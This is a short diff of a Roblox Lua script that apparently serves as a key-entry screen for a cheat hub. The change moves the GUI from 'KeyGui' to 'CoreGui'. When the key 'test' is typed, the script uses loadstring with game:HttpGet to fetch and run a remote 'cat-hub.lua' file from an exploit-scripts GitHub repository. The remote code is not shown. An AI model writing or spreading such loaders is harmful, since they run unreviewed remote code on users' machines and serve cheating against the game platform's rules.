@@ -11,7 +11,7 @@ local UICorner_2 = Instance.new("UICorner")
 
 --Properties:
 
-ScreenGui.Parent = game.KeyGui
+ScreenGui.Parent = game.CoreGui
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 Frame.Parent = ScreenGui
@@ -81,7 +81,7 @@ local function XKCQPNL_fake_script() -- KeyHereTextBox.LocalScript
 	script.Parent.FocusLost:Connect(function(enter)
 		if script.Parent.Text == 'test' then
 			loadstring(game:HttpGet"https://raw.githubusercontent.com/exploitscat/Roblox-Scripts/main/cat-hub.lua")()
-			game:GetService("KeyGui").ScreenGui:Destroy()
+			game:GetService("CoreGui").ScreenGui:Destroy()
 			end
 	end)
 end
